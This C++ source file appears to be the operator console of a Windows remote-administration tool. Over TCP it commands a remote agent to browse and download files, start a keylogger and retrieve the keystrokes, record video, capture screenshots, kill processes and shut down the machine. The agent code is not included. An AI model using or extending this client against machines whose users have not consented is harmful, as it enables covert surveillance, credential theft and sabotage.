#include "HandleFeature.hpp"

#include <codecvt>
#include <fstream>
#include <iostream>
#include <mfobjects.h>
#include <random>
#include <unordered_map>
#include <ws2tcpip.h>
#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include "Shlwapi.h"
#include "mfreadwrite.h"
#include <mfobjects.h>
#include <mferror.h>
#include <Dbt.h>
#include <ks.h>
#include <ksmedia.h>
#include "Utils.hpp"

int Feature::sendRequest(SOCKET sock, int type, int size, const char *data) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint16_t> dis(0, UINT16_MAX);
    PacketHeader header{};
    header.request_id = dis(gen);
    header.request_type = type;
    header.request_key = requestKey;
    header.packet_size = sizeof(PacketHeader) + size;

    // Send the header
    int bytessent = send(sock, reinterpret_cast<const char *>(&header), sizeof(header), 0);
    if (bytessent <= 0) {
        std::cerr << "Failed to send request header." << std::endl;
        return -1;
    }
    if (size == 0 || data == nullptr) {
        return header.request_id;
    }
    bytessent = send(sock, data, size, 0);
    if (bytessent <= 0) {
        std::cerr << "Failed to send request." << std::endl;
        return -1;
    }
    return header.request_id;
}

int Feature::receiveResponse(SOCKET sock, int &size, char **data) {
    *data = nullptr;
    ResponseHeader responseHeader{};
    int bytesReceived = recv(sock, reinterpret_cast<char *>(&responseHeader), sizeof(responseHeader), 0);
    if (bytesReceived <= 0) {
        std::cerr << "Failed to receive response header." << std::endl;
        return -1;
    }
    size = responseHeader.packageSize - sizeof(responseHeader);
    if (size <= 0) {
        return responseHeader.statusCode;
    }
    *data = new char[size + 1];
    int totalrecv = 0;
    while (totalrecv < size) {
        int brecv = recv(sock, (*data) + totalrecv, size - totalrecv, 0);
        totalrecv += brecv;
        if (brecv <= 0) {
            std::cerr << "Failed to receive response." << std::endl;
            break;
        }
    }
    (*data)[size] = '\0';
    return responseHeader.statusCode;
}

SOCKET Feature::init() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    inet_pton(AF_INET, m_IP, &serverAddr.sin_addr);
    if (connect(sock, reinterpret_cast<sockaddr *>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to server: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        return INVALID_SOCKET;
    }
    return sock;
}

int FileFeature::requestingFeature(RequestParam rParam) {
    std::lock_guard lock(m_mutex);
    returnValue = -2;
    if (rParam.type > 1 || rParam.type < 0) {
        std::cerr << "Invalid request type: " << rParam.type << std::endl;
        return returnValue = -1;
    }
    SOCKET sock = init();
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to initialize socket for process feature." << std::endl;
        return returnValue = -1;
    }
    if (rParam.type == 0) {
        if (rParam.size != 0)
            sendRequest(sock, rParam.type, rParam.size, rParam.data);
        else
            sendRequest(sock, rParam.type, (currentDirectory / currentSelectedFile).string().size(),
                    (currentDirectory / currentSelectedFile).string().c_str());
        int responseSize = 0;
        char *responseData = nullptr;
        int res = receiveResponse(sock, responseSize, &responseData);
        currentData = std::string(responseData, responseSize);
        if (res < 0) {
            std::cerr << "Failed to receive response for file request." << std::endl;
            return returnValue = -1;
        }
        std::ofstream outFile(saveFilePath, std::ios::binary);
        if (!outFile) {
            std::cerr << "Failed to open file for writing: " << saveFilePath << std::endl;
            delete[] responseData;
            return returnValue = -1;
        }
        outFile.write(responseData, responseSize);
        outFile.close();
        delete[] responseData;
        return returnValue = 0;
    }
    if (rParam.type == 1) {
        if (currentDirectory == "") {
            currentDirectory = "C:\\";
        }
        if (rParam.size == 0)
            sendRequest(sock, rParam.type, currentDirectory.string().size(), currentDirectory.string().c_str());
        else
            sendRequest(sock, rParam.type, rParam.size, rParam.data);
        int responseSize = 0;
        char *responseData = nullptr;
        int res = receiveResponse(sock, responseSize, &responseData);
        if (res < 0) {
            std::cerr << "Failed to receive response for file list request." << std::endl;
            return returnValue = -1;
        }
        fileList.clear();
        fileSelectionMap.clear();
        std::string responseStr(responseData, responseSize);
        currentData = responseStr;
        if (currentDirectory.root_path() != currentDirectory) {
            fileList.push_back({"..", true, "-"});
        }
        while (responseStr.find('\n') != std::string::npos) {
            FileStruct file;
            file.isDirectory = (responseStr[0] == 'D');
            responseStr.erase(0, 1);
            file.name = responseStr.substr(0, responseStr.find('\n'));
            responseStr.erase(0, responseStr.find('\n') + 1);
            file.size = responseStr.substr(0, responseStr.find('\n'));
            if (file.isDirectory)
                file.size = "-";
            responseStr.erase(0, responseStr.find('\n') + 1);
            fileList.push_back(file);
        }

        delete[] responseData;
        return returnValue = 0;
    }
    std::cerr << "Invalid request type: " << rParam.type << std::endl;
    return returnValue = -1;
}

std::vector<FileFeature::FileStruct> FileFeature::getFileList() {
    std::lock_guard lock(m_mutex);
    return fileList;
}

HRESULT FileFeature::openSaveAsDialog(std::string defaultFileName) {
    std::lock_guard lock(m_mutex);
    IFileDialog *pFileDialog = nullptr;
    IFileDialogEvents *pFileDialogEvents = nullptr;
    IShellItem *pItem = nullptr;
    PWSTR pszFilePath = nullptr;
    DWORD dwCookie = 0;
    HRESULT hr = CoCreateInstance(CLSID_FileSaveDialog, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pFileDialog));
    if (SUCCEEDED(hr))
        hr = CDialogEHandler::CreateInstance(IID_PPV_ARGS(&pFileDialogEvents));
    if (SUCCEEDED(hr))
        hr = pFileDialog->Advise(pFileDialogEvents, &dwCookie);
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetFileTypes(ARRAYSIZE(c_DownloadTypes), c_DownloadTypes);
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetFileName(std::wstring(defaultFileName.begin(), defaultFileName.end()).c_str());
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetTitle(L"Save File As");
    if (SUCCEEDED(hr))
        hr = pFileDialog->Show(nullptr);
    if (SUCCEEDED(hr))
        hr = pFileDialog->GetResult(&pItem);
    if (SUCCEEDED(hr))
        hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszFilePath);
    if (SUCCEEDED(hr)) {
        saveFilePath = std::wstring_convert<std::codecvt_utf8<wchar_t> >().to_bytes(pszFilePath);
        CoTaskMemFree(pszFilePath);
    }
    if (pItem)
        pItem->Release();
    if (pFileDialogEvents) {
        pFileDialog->Unadvise(dwCookie);
        pFileDialogEvents->Release();
    }
    if (pFileDialog) {
        pFileDialog->Release();
    }
    return hr;
}

std::string FileFeature::getCurrentDirectory() const {
    return currentDirectory.string();
}

std::string FileFeature::getCurrentFileName() {
    std::lock_guard lock(m_mutex);
    return currentSelectedFile;
}

std::string FileFeature::getSaveFilePath() const {
    return saveFilePath;
}

void FileFeature::LoadFileList() {
    std::lock_guard lock(m_mutex);
    for (auto &file: fileList) {
        ImGui::TableNextRow();
        ImGui::TableNextColumn();
        ImGui::PushID(file.name.c_str());
        if (ImGui::Selectable(file.name.c_str(), &fileSelectionMap[file.name], ImGuiSelectableFlags_SpanAllColumns)) {
            if (file.name == currentSelectedFile) {
                fileSelectionMap[file.name] = false;
                currentSelectedFile.clear();
            } else {
                fileSelectionMap[currentSelectedFile] = false;
                fileSelectionMap[file.name] = true;
                currentSelectedFile = file.name;
            }
        }
        ImGui::TableNextColumn();
        ImGui::Text("%s", file.size.c_str());
        ImGui::TableNextColumn();
        ImGui::Text("%s", file.isDirectory ? "Directory" : "File");
        ImGui::PopID();
    }
}

FileFeature::FileStruct *FileFeature::getSelectedFiles() {
    std::lock_guard lock(m_mutex);
    if (currentDirectory.empty() || fileSelectionMap[currentSelectedFile] == false)
        return nullptr;
    for (auto &file: fileList) {
        if (file.name == currentSelectedFile) {
            return &file;
        }
    }
    std::cerr << "No file selected or file not found in the list." << std::endl;
    return nullptr;
}

bool FileFeature::isFileSelected() {
    std::lock_guard lock(m_mutex);
    return !currentSelectedFile.empty() && fileSelectionMap[currentSelectedFile];
}

int KeyloggerFeature::requestingFeature(RequestParam rParam) {
    std::lock_guard lock(m_mutex);
    returnValue = -2;
    if (rParam.type <= 0) {
        std::cerr << "Invalid request type for keylogger feature: " << rParam.type << std::endl;
        return returnValue = -1;
    }
    SOCKET sock = init();
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to initialize socket for process feature." << std::endl;
        return returnValue = -1;
    }
    sendRequest(sock, rParam.type, 0, nullptr);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(sock, responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Keylogger is already running." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Failed to start keylogger." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x00) {
        if (rParam.type == 1) {
            std::cout << "Keylogger started successfully." << std::endl;
            isKeyloggerRunning.store(true);
            keyloggingValue.clear();
        } else if (rParam.type == 2) {
            std::cout << "Keylogger stopped successfully." << std::endl;
            isKeyloggerRunning = false;
            keyloggingValue = responseData ? std::string(responseData) : "";
        }

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Keylogger is not running." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x04) {
        std::cout << responseData << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    std::cerr << "Unknown response status code: " << res << std::endl;
    delete[] responseData;
    return -1;
}

bool KeyloggerFeature::isRunning() const {
    return isKeyloggerRunning.load();
}

std::string KeyloggerFeature::getLogging() {
    std::lock_guard lock(m_mutex);
    return keyloggingValue;
}

int VideoFeature::requestingFeature(RequestParam rParam) {
    returnValue = -1;
    if (rParam.type <= 0) {
        std::cerr << "Invalid request type for keylogger feature: " << rParam.type << std::endl;
        return -1;
    }
    SOCKET sock = init();
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to initialize socket for process feature." << std::endl;
        return returnValue = -1;
    }
    sendRequest(sock, rParam.type, 0, nullptr);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(sock, responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Invalid request key for video recording." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Video recording is already in progress." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x00) {
        if (rParam.type == 1) {
            std::cout << "Video recording started successfully." << std::endl;
            isRunning = true;
        } else if (rParam.type == 2) {
            videoContent = responseData ? std::string(responseData, responseSize) : "";
            isRunning = false;
            isVideoAvailable = true;
            std::ofstream videoFile("temp.file", std::ios::binary);
            if (videoFile) {
                videoFile.write(videoContent.c_str(), videoContent.size());
                videoFile.close();
            } else {
                std::cerr << "Failed to open temporary file for writing." << std::endl;
                delete[] responseData;
                isVideoAvailable = false;
                return returnValue = -1;
            }
            IMFAttributes* attributes = nullptr;
            IMFSourceReader* sourceReader = nullptr;
            IMFSample* sample = nullptr;
            DWORD streamIDX = 0;
            DWORD flags = 0;
            LONGLONG llTimeStamp = 0;
            BYTE* videoData = nullptr;
            IMFMediaBuffer* buffer = nullptr;
            DWORD videoDataLen = 0;
            HRESULT hr = MFCreateAttributes(&attributes, 1);
            if (SUCCEEDED(hr))
                hr = MFCreateSourceReaderFromURL(L"temp.file", attributes, &sourceReader);
            if (SUCCEEDED(hr)) {
                IMFMediaType* mediaType = nullptr;
                hr = sourceReader->GetNativeMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &mediaType);
                if (SUCCEEDED(hr))
                    hr = mediaType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
                if (SUCCEEDED(hr))
                    hr = mediaType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
                if (SUCCEEDED(hr))
                    hr = sourceReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                                                          nullptr, mediaType);
                SafeRelease(&mediaType);
            }
            if (SUCCEEDED(hr))
                hr = sourceReader->ReadSample(
                    MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                    0,
                    &streamIDX,
                    &flags,
                    &llTimeStamp,
                    &sample
                );
            if (SUCCEEDED(hr) && sample) {
                hr = sample->ConvertToContiguousBuffer(&buffer);
                if (SUCCEEDED(hr)) {
                    hr = buffer->Lock(&videoData, nullptr, &videoDataLen);
                    if (SUCCEEDED(hr)) {
                        IMFMediaType* mediaType = nullptr;
                        UINT32 width = 0, height = 0;
                        hr = sourceReader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &mediaType);
                        if (SUCCEEDED(hr))
                            MFGetAttributeSize(mediaType, MF_MT_FRAME_SIZE, &width, &height);
                        if (width > 0 && height > 0) {
                            if (videoTextureID != 0)
                                glDeleteTextures(1, &videoTextureID);
                            glGenTextures(1, &videoTextureID);
                            glBindTexture(GL_TEXTURE_2D, videoTextureID);
                            glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
                            glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);

                            glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, videoData);
                            std::cout << "Successfully extract first frame" << std::endl;
                        }
                        SafeRelease(&mediaType);
                        buffer->Unlock();
                    }
                }
            }

            SafeRelease(&buffer);
            SafeRelease(&sample);
            SafeRelease(&sourceReader);
            SafeRelease(&attributes);
        }

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Video recording is not in progress." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x04) {
        std::cout << "Invalid request type for video recording." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }

    delete[] responseData;

    std::cerr << "Unknown response status code: " << res << std::endl;
    return -1;
}

HRESULT VideoFeature::openSaveAsDialog(std::string defaultFileName) {
    std::lock_guard lock(m_mutex);
    IFileDialog *pFileDialog = nullptr;
    IFileDialogEvents *pFileDialogEvents = nullptr;
    IShellItem *pItem = nullptr;
    PWSTR pszFilePath = nullptr;
    DWORD dwCookie = 0;
    HRESULT hr = CoCreateInstance(CLSID_FileSaveDialog, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pFileDialog));
    if (SUCCEEDED(hr))
        hr = CDialogEHandler::CreateInstance(IID_PPV_ARGS(&pFileDialogEvents));
    if (SUCCEEDED(hr))
        hr = pFileDialog->Advise(pFileDialogEvents, &dwCookie);
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetFileTypes(ARRAYSIZE(c_rgSaveTypes), c_rgSaveTypes);
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetDefaultExtension(L"bmp");
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetFileName(std::wstring(defaultFileName.begin(), defaultFileName.end()).c_str());
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetTitle(L"Save Video As");
    if (SUCCEEDED(hr))
        hr = pFileDialog->Show(nullptr);
    if (SUCCEEDED(hr))
        hr = pFileDialog->GetResult(&pItem);
    if (SUCCEEDED(hr))
        hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszFilePath);
    if (SUCCEEDED(hr)) {
        videoFilePath = std::wstring_convert<std::codecvt_utf8<wchar_t> >().to_bytes(pszFilePath);
        std::ofstream outFile(videoFilePath, std::ios::binary);
        if (outFile) {
            outFile.write(videoContent.c_str(), videoContent.size());
            outFile.close();
            std::cout << "Video saved successfully to: " << videoFilePath << std::endl;
        } else {
            std::cerr << "Failed to open file for writing: " << videoFilePath << std::endl;
            hr = E_FAIL;
        }
        CoTaskMemFree(pszFilePath);
    }
    if (pItem)
        pItem->Release();
    if (pFileDialogEvents) {
        pFileDialog->Unadvise(dwCookie);
        pFileDialogEvents->Release();
    }
    if (pFileDialog) {
        pFileDialog->Release();
    }
    return hr;
}

WindowFeature::~WindowFeature() {
    if (textureID != 0) {
        glDeleteTextures(1, &textureID);
        textureID = 0;
    }
}

int WindowFeature::requestingFeature(RequestParam rParam) {
    returnValue = -1;
    isGottenScreenshot = false;
    screenshotData.clear();
    if (rParam.type < 0) {
        std::cerr << "Invalid request type for window feature: " << rParam.type << std::endl;
        return -1;
    }
    SOCKET sock = init();
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to initialize socket for process feature." << std::endl;
        return returnValue = -1;
    }
    sendRequest(sock, rParam.type, 0, nullptr);
    int responseSize = 0;
    char *responseData = nullptr;
    int res = receiveResponse(sock, responseSize, &responseData);
    if (res == 0x01) {
        std::cerr << "Invalid request key for window command." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x02) {
        std::cerr << "Unable to open process token for shutdown/restart." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x03) {
        std::cerr << "Failed to set Master Volume." << std::endl;

        delete[] responseData;

        return returnValue = res;
    }
    if (res == 0x00) {
        if (rParam.type == 1) {
            std::cout << "Volume increased successfully." << std::endl;
        } else if (rParam.type == 2) {
            std::cout << "Volume decreased successfully." << std::endl;
        } else if (rParam.type == 3) {
            std::cout << "System shutdown initiated successfully." << std::endl;
        } else if (rParam.type == 4) {
            std::cout << "System restart initiated successfully." << std::endl;
        } else if (rParam.type == 0) {
            isGottenScreenshot = true;
            screenshotData = responseData ? std::string(responseData, responseSize) : "";
            int width, height;
            if (textureID != 0) {
                glDeleteTextures(1, &textureID);
            }
            bool ret = LoadTextureFromMemory(screenshotData.c_str(), screenshotData.size(), &textureID, &width,
                                             &height);
            assert(ret);
            std::cout << "Screenshot taken successfully." << std::endl;
        }
        delete[] responseData;
        return returnValue = res;
    }
    std::cerr << "Unknown response status code: " << res << std::endl;

    delete[] responseData;

    return -1;
}

HRESULT WindowFeature::openSaveAsDialog(std::string defaultFileName) {
    std::lock_guard lock(m_mutex);
    IFileDialog *pFileDialog = nullptr;
    IFileDialogEvents *pFileDialogEvents = nullptr;
    IShellItem *pItem = nullptr;
    PWSTR pszFilePath = nullptr;
    DWORD dwCookie = 0;
    HRESULT hr = CoCreateInstance(CLSID_FileSaveDialog, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pFileDialog));
    if (SUCCEEDED(hr))
        hr = CDialogEHandler::CreateInstance(IID_PPV_ARGS(&pFileDialogEvents));
    if (SUCCEEDED(hr))
        hr = pFileDialog->Advise(pFileDialogEvents, &dwCookie);
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetFileTypes(ARRAYSIZE(c_rgSaveTypes), c_rgSaveTypes);
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetDefaultExtension(L"bmp");
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetFileName(std::wstring(defaultFileName.begin(), defaultFileName.end()).c_str());
    if (SUCCEEDED(hr))
        hr = pFileDialog->SetTitle(L"Save Screenshot As");
    if (SUCCEEDED(hr))
        hr = pFileDialog->Show(nullptr);
    if (SUCCEEDED(hr))
        hr = pFileDialog->GetResult(&pItem);
    if (SUCCEEDED(hr))
        hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszFilePath);
    if (SUCCEEDED(hr)) {
        screenshotFilePath = std::wstring_convert<std::codecvt_utf8<wchar_t> >().to_bytes(pszFilePath);
        std::cout << "Screenshot will be saved to: " << screenshotFilePath << std::endl;
        std::ofstream outFile(screenshotFilePath, std::ios::binary);
        if (outFile) {
            outFile.write(screenshotData.c_str(), screenshotData.size());
            outFile.close();
            std::cout << "Screenshot saved successfully." << std::endl;
        } else {
            std::cerr << "Failed to open file for writing: " << screenshotFilePath << std::endl;
        }
        CoTaskMemFree(pszFilePath);
    }
    if (pItem)
        pItem->Release();
    if (pFileDialogEvents) {
        pFileDialog->Unadvise(dwCookie);
        pFileDialogEvents->Release();
    }
    if (pFileDialog) {
        pFileDialog->Release();
    }
    return hr;
}

std::string WindowFeature::getScreenshotData() {
    std::lock_guard lock(m_mutex);
    return screenshotData;
}

unsigned int WindowFeature::getTextID() {
    return textureID;
}

std::unordered_map<DWORD, bool> ProcessFeature::m_selectedProcesses;

void ProcessFeature::ProcessInfoNode::DisplayNode(const ProcessInfoNode *node) {
    ImGui::TableNextRow();
    ImGui::TableNextColumn();
    ImGui::Selectable((std::string("###") + node->Name + std::to_string(node->PID)).c_str(),
                      &m_selectedProcesses[node->PID], ImGuiSelectableFlags_SpanAllColumns);
    ImGui::SameLine();
    ImGui::PushID(node->PID);

    bool isParent = (node->childCount > 0);
    ImGuiTreeNodeFlags node_flags = ImGuiTreeNodeFlags_SpanAllColumns | ImGuiTreeNodeFlags_DefaultOpen;

    // First column: Process Name (with tree structure if parent)
    if (isParent) {
        bool isOpen = ImGui::TreeNodeEx(node->Name, node_flags);
        ImGui::TableNextColumn();

        // Second column: PID
        ImGui::Text("%d", node->PID);
        ImGui::TableNextColumn();

        // Third column: Memory Usage
        ImGui::Text("%d kB", node->MemoryUsage / 1024);
        ImGui::TableNextColumn();

        // Fourth column: CPU Time
        ImGui::Text("%d ms", node->CPUTimeUser / 10000);

        // Display children if tree node is open
        if (isOpen) {
            ImGui::PopID();
            for (int i = 0; i < node->childCount; ++i) {
                DisplayNode(node->children[i]);
            }
            ImGui::TreePop();
            ImGui::PushID(node->PID);
        }
    } else {
        // Leaf node - display as bullet point
        ImGui::TreeNodeEx(
            node->Name,
            node_flags | ImGuiTreeNodeFlags_Leaf | ImGuiTreeNodeFlags_Bullet | ImGuiTreeNodeFlags_NoTreePushOnOpen);
        ImGui::TableNextColumn();

        // Second column: PID
        ImGui::Text("%d", node->PID);
        ImGui::TableNextColumn();

        // Third column: Memory Usage
        ImGui::Text("%d kB", node->MemoryUsage / 1024);
        ImGui::TableNextColumn();

        // Fourth column: CPU Time
        ImGui::Text("%d ms", node->CPUTimeUser / 10000);
    }
    ImGui::PopID();
}

ProcessFeature::ProcessInfoNode::ProcessInfoNode(DWORD pid, const char *name, DWORD parentPID, SIZE_T memoryUsage,
                                                 ULONGLONG cpuTimeUser): PID(pid), ParentPID(parentPID),
                                                                         MemoryUsage(memoryUsage),
                                                                         CPUTimeUser(cpuTimeUser) {
    Name = strdup(name);
    children = new ProcessInfoNode *[0];
}

ProcessFeature::ProcessInfoNode::~ProcessInfoNode() {
    if (children) {
        for (int i = 0; i < childCount; ++i) {
            delete children[i];
        }
        delete[] children;
    }
}

void ProcessFeature::ProcessInfoNode::addChild(ProcessInfoNode *child) {
    if (childCount < 0) return;
    auto **newChildren = new ProcessInfoNode *[childCount + 1];
    for (int i = 0; i < childCount; ++i) {
        newChildren[i] = children[i];
    }
    newChildren[childCount] = child;
    delete[] children;
    children = newChildren;
    childCount++;
}

int ProcessFeature::requestingFeature(RequestParam rParam) {
    std::lock_guard lock(m_mutex);
    returnValue = -1;
    if (rParam.type <= 0) {
        std::cerr << "Invalid request type for process feature: " << rParam.type << std::endl;
        return -1;
    }
    SOCKET sock = init();
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to initialize socket for process feature." << std::endl;
        return returnValue = -1;
    }
    sendRequest(sock, rParam.type, rParam.size, rParam.data);
    ResponseHeader responseHeader{};
    int bytesrecv = recv(sock, reinterpret_cast<char *>(&responseHeader), sizeof(responseHeader), 0);
    if (bytesrecv <= 0) {
        std::cerr << "Failed to receive response header." << std::endl;
        return returnValue = -1;
    }
    if (responseHeader.statusCode == 0x01) {
        std::cerr << "Failed to terminateProcess." << std::endl;
        return returnValue = responseHeader.statusCode;
    }
    if (responseHeader.statusCode == 0x02) {
        std::cerr << "Failed to open file by path." << std::endl;
        return returnValue = responseHeader.statusCode;
    }
    if (responseHeader.statusCode == 0x03) {
        std::cerr << "Unknown request type for process feature." << std::endl;
        return returnValue = responseHeader.statusCode;
    }
    if (responseHeader.statusCode == 0x00) {
        char *responseData = nullptr;
        int responseSize = 0;
        responseSize = responseHeader.packageSize - sizeof(responseHeader);
        responseData = new char[responseSize];
        if (rParam.type == 1) {
            std::cout << "Process list received successfully." << std::endl;
            uint32_t count = 0;
            recv(sock, reinterpret_cast<char *>(&count), sizeof(count), 0);
            std::cout << "Number of processes: " << count << std::endl;
            std::vector<ProcessInfoNode *> processList;
            m_allNodes.clear();
            m_selectedProcesses.clear();
            for (uint32_t i = 0; i < count; ++i) {
                DWORD pid;
                char name[261];
                DWORD parentPID;
                SIZE_T memoryUsage;
                ULONGLONG cpuTimeUser;
                uint16_t nameLength = 0;
                recv(sock, reinterpret_cast<char *>(&pid), sizeof(pid), 0);
                recv(sock, reinterpret_cast<char *>(&nameLength), sizeof(nameLength), 0);
                recv(sock, name, nameLength, 0);
                name[nameLength] = '\0';
                recv(sock, reinterpret_cast<char *>(&parentPID), sizeof(parentPID), 0);
                recv(sock, reinterpret_cast<char *>(&memoryUsage), sizeof(memoryUsage), 0);
                recv(sock, reinterpret_cast<char *>(&cpuTimeUser), sizeof(cpuTimeUser), 0);
                if (parentPID == 0)
                    m_allNodes[pid] = new ProcessInfoNode(pid, name, parentPID, memoryUsage, cpuTimeUser);
                else
                    processList.push_back(new ProcessInfoNode(pid, name, parentPID, memoryUsage, cpuTimeUser));
            }
            for (auto &node: processList) {
                if (m_allNodes.contains(node->ParentPID)) {
                    m_allNodes[node->ParentPID]->addChild(node);
                } else {
                    m_allNodes[node->PID] = node;
                }
            }
        } else if (rParam.type == 2) {
            m_selectedProcesses.erase(*reinterpret_cast<DWORD *>(rParam.data));
            std::cout << "Process terminated successfully." << std::endl;
        } else if (rParam.type == 3) {
            std::cout << "File opened successfully." << std::endl;
        }
        delete[] responseData;
        return returnValue = responseHeader.statusCode;
    }

    return -1;
}

std::unordered_map<DWORD, ProcessFeature::ProcessInfoNode *> ProcessFeature::getProcessList() {
    std::lock_guard lock(m_mutex);
    return m_allNodes;
}

std::vector<DWORD> ProcessFeature::getSelectedProcesses() {
    std::vector<DWORD> selected;
    for (const auto &pair: m_selectedProcesses) {
        if (pair.second) {
            selected.push_back(pair.first);
        }
    }
    return selected;
}

bool ProcessFeature::isAnyProcessSelected() {
    for (auto &pair: m_selectedProcesses) {
        if (pair.second) {
            return true;
        }
    }
    return false;
}

ULONG CDialogEHandler::Release() {
    long cRef = InterlockedDecrement(&_cRef);
    if (!cRef)
        delete this;
    return cRef;
}

HRESULT CDialogEHandler::CreateInstance(const IID &riid, void **ppv) {
    *ppv = nullptr;
    CDialogEHandler *pHandler = new CDialogEHandler();
    HRESULT hhr = pHandler ? S_OK : E_OUTOFMEMORY;
    if (SUCCEEDED(hhr)) {
        hhr = pHandler->QueryInterface(riid, ppv);
        pHandler->Release();
    }
    return hhr;
}
